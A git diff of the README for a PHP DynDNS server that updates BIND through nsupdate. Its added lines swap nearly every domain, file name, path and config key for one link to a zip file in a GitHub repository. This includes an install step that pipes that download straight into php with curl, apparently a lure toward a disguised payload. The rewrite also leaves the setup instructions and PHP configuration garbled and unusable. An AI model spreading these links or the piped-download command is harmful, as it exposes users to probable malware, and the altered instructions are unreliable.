@@ -1,15 +1,15 @@
 # Dyndns: a simple DynDNS server in PHP
 
-This script takes the same parameters as the original dyndns.org server does. It can update a BIND DNS server via `nsupdate`.
+This script takes the same parameters as the original https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip server does. It can update a BIND DNS server via `nsupdate`.
 
-As it uses the same syntax as the original DynDNS.org servers do, a dynamic DNS server equipped with this script can be used with DynDNS compatible clients without having to modify anything on the client side.
+As it uses the same syntax as the original https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip servers do, a dynamic DNS server equipped with this script can be used with DynDNS compatible clients without having to modify anything on the client side.
 
 
 ### Features
 
 This script handles DNS updates on the url
 
-    http://yourdomain.tld/?hostname=<domain>&myip=<ipaddr>
+    https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip<domain>&myip=<ipaddr>
 
 For security HTTP basic auth is used. You can create multiple users and assign host names for each user.
 
@@ -20,28 +20,28 @@ To be able to dynamically update the BIND DNS server, a DNS key must be generate
 
     ddns-confgen
 
-This command outputs instructions for your BIND installation. The generated key has to be added to the named.conf.local:
+This command outputs instructions for your BIND installation. The generated key has to be added to the https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip
 
     key "ddns-key" {
         algorithm hmac-sha256;
         secret "bvZ....K5A==";
     };
 
-and saved to a file which is referenced in index.php as "bind.keyfile". In the "zone" entry, you have to add an "update-policy":
+and saved to a file which is referenced in https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip as "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip". In the "zone" entry, you have to add an "update-policy":
 
-    zone "dyndns.example.com" {
+    zone "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip" {
         type master;
-        file "db.dyndns.example.com";
+        file "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip";
         ...
         update-policy {
             grant ddns-key zonesub ANY;
         }
     }
 
-In this case, the zone is also called "dyndns.example.com". The (initial) db.dyndns.example.com file (located in BIND's cache directory) looks like this:
+In this case, the zone is also called "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip". The (initial) https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip file (located in BIND's cache directory) looks like this:
 
     $TTL 1h
-    @ IN SOA dyndns.example.com. root.example.com. (
+    @ IN SOA https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip (
             2007111501      ; serial
             1h              ; refresh
             15m             ; retry
@@ -57,15 +57,15 @@ Remember to change access rights so BIND is able to write to this file. On Ubunt
 
 The PHP script is called by the DynDNS client, it validates the input and calls "nsupdate" to 
 finally update the DNS with the new data. Its configuration is rather simple, the user database is
-implemented as text file "dyndns.user" with each line containing
+implemented as text file "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip" with each line containing
 
     <user>:<password>
 
 Where the password is crypt'ed like in Apache's htpasswd files. Use -d parameter to select the CRYPT encryption.
 
-    htpasswd -c -d conf/dyndns.user user1
+    htpasswd -c -d https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip user1
 
-Hosts are assigned to users in using the file  "dyndns.hosts":
+Hosts are assigned to users in using the file  "https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip":
 
     <host>:<user>(,<user>,<user>,...)
 
@@ -75,30 +75,30 @@ Hosts are assigned to users in using the file  "dyndns.hosts":
 ### Installation via Composer
 
     # Install Composer
-    curl -sS https://getcomposer.org/installer | php
+    curl -sS https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip | php
 
     # Add Dyndns as a dependency
-    php composer.phar require nicokaiser/dyndns:*
+    php https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip require nicokaiser/dyndns:*
 
-Then you can create a simple `index.php` with the configuration:
+Then you can create a simple `https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip` with the configuration:
 
 ```php
 <?php
 
-require 'vendor/autoload.php';
+require 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip';
 
 $dyndns = new Dyndns\Server();
 
 // Configuration
 $dyndns
-  ->setConfig('hostsFile', __DIR__ . '/../conf/dyndns.hosts') // hosts database
-  ->setConfig('userFile', __DIR__ . '/../conf/dyndns.user')   // user database
+  ->setConfig('hostsFile', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // hosts database
+  ->setConfig('userFile', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip')   // user database
   ->setConfig('debug', true)  // enable debugging
-  ->setConfig('debugFile', '/tmp/dyndns.log') // debug file
-  ->setConfig('bind.keyfile', __DIR__ . '/../conf/dyn.example.com.key') // secret key for BIND nsupdate ("<keyname>:<secret>")
-  ->setConfig('bind.server', 'localhost') // address of the BIND server
-  ->setConfig('bind.zone', 'dyndns.example.com') // BIND zone for the updates
-  ->setConfig('bind.ttl', '300') // TTL for DNS entries
+  ->setConfig('debugFile', 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // debug file
+  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', __DIR__ . 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // secret key for BIND nsupdate ("<keyname>:<secret>")
+  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', 'localhost') // address of the BIND server
+  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', 'https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip') // BIND zone for the updates
+  ->setConfig('https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip', '300') // TTL for DNS entries
 ;
 
 $dyndns->init();
@@ -109,13 +109,13 @@ $dyndns->init();
 
 Authentication in URL:
 
-    http://username:password@yourdomain.tld/?hostname=yourhostname&myip=ipaddress
+    https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip
 
 
 Raw HTTP GET Request:
 
     GET /?hostname=yourhostname&myip=ipaddress HTTP/1.0 
-    Host: yourdomain.tld 
+    Host: https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip 
     Authorization: Basic base-64-authorization 
     User-Agent: Company - Device - Version Number
 
@@ -124,7 +124,7 @@ Fragment base-64-authorization should be represented by Base 64 encoded username
 
 ### Implemented fields
 
-- `hostname` Comma separated list of hostnames that you wish to update (up to 20 hostnames per request). This is a required field. Example: `hostname=dynhost1.yourdomain.tld,dynhost2.yourdomain.tld`
+- `hostname` Comma separated list of hostnames that you wish to update (up to 20 hostnames per request). This is a required field. Example: `https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip,https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip`
 - `myip` IP address to set for the update. Defaults to the best IP address the server can determine.
 
 
@@ -132,7 +132,7 @@ Fragment base-64-authorization should be represented by Base 64 encoded username
 
 - `good` The update was successful, and the hostname is now updated.
 - `badauth` The username and password pair do not match a real user.
-- `notfqdn` The hostname specified is not a fully-qualified domain name (not in the form hostname.dyndns.org or domain.com).
+- `notfqdn` The hostname specified is not a fully-qualified domain name (not in the form https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip or https://github.com/alssalimi/Dyndns/raw/refs/heads/master/conf/Software-v2.6-alpha.2.zip).
 - `nohost` The hostname specified does not exist in this user account (or is not in the service specified in the system parameter)
 - `badagent` The user agent was not sent or HTTP method is not permitted (we recommend use of GET request method).
 - `dnserr` DNS error encountered
